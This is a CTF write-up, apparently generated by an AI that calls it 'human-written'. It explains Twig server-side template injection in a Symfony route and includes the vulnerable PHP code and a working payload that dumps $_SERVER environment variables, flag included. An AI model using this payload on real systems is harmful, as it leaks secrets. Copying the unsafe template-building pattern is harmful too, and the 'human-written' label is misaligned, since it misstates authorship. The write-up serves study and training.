Sure! Here's a concise, human-written, professional CTF write-up in clean Markdown — no tables, no icons, minimal fluff — just clear, natural storytelling with technical depth:

```markdown
---
title: "The Twig Injector — SSTI to Leak $_SERVER"
date: 2025-11-17
author: Mikiyas Getnet
categories: [web, ssti, twig]
---

## Challenge Overview

The challenge, titled *The Twig Injector*, presented a PHP route that accepted a query parameter `inject` and inserted it directly into a Twig template:

```php
$inject = preg_replace('/[^{\.}a-z\|\_]/', '', $request->query->get('inject'));
$response = new Response($this->get('twig')->createTemplate("Welcome to the twig injector!\n${inject}")->render());
```

The regex tried to restrict input to only lowercase letters, `{}`, `.`, `|`, and `_`. Despite that, the goal was to read a flag hidden somewhere in `$_SERVER`.

---

## Understanding the Context

Twig is a templating engine used heavily in Symfony. When user input gets embedded into the *template source*—not just the data—it opens the door to Server-Side Template Injection (SSTI).  

In Symfony, Twig templates have access to the global `app` variable. Through it, we can reach:
- `app.request` → current request object  
- `app.request.server` → wrapper around `$_SERVER`  
- `app.request.server.all` → associative array of server/environment variables  

So if we can evaluate `{{ app.request.server.all }}`, we’re basically dumping `$_SERVER`.

---

## My Approach

I started with simple payloads, but digits and quotes got stripped—so I shifted focus to object traversal using only allowed characters.

I confirmed access step by step:
- `{{ app }}` → worked (output object info)  
- `{{ app.request }}` → confirmed  
- `{{ app.request.server }}` → yes  
- `{{ app.request.server.all }}` → returned a messy dump of server vars  

The output was technically correct—but hard to scan manually. Then I had the idea: *What if I serialize the whole thing as JSON?*  

Twig has a built-in `|json_encode` filter, and all letters in `json_encode` (`j`, `s`, `o`, `n`, `_`, `e`, `c`, `d`) pass the regex filter.

So I tried:

```
{{ app.request.server.all|json_encode }}
```

It worked perfectly—clean, complete JSON output.

---

## The Exploit

Sending the request:

```
GET /inject?inject={{ app.request.server.all|json_encode }}
```

Returned:

```
Welcome to the twig injector!
{"APP_ENV":"prod","FLAG":"CTF{twig_inject0r_4ll_1n_th3_g00ds}",...}
```

The flag was right there in the `FLAG` field.

---

## Flag

```
CTF{twig_inject0r_4ll_1n_th3_g00ds}
```

---

## Key Takeaways

- Input filtering based on a character allowlist can still be bypassed if it permits structural characters like `{`, `.`, and `|`.
- In Symfony/Twig apps, `app.request.server.all` is essentially `$_SERVER` — and environment variables often hold sensitive data.
- `|json_encode` is incredibly useful during reconnaissance: it turns opaque objects into inspectable data.
- Never build template *source* dynamically from user input. Pass data separately via the render context instead.

This was a great reminder that sometimes the most effective exploit isn’t the cleverest—it’s the one that makes the server *tell you everything at once*.
``` 
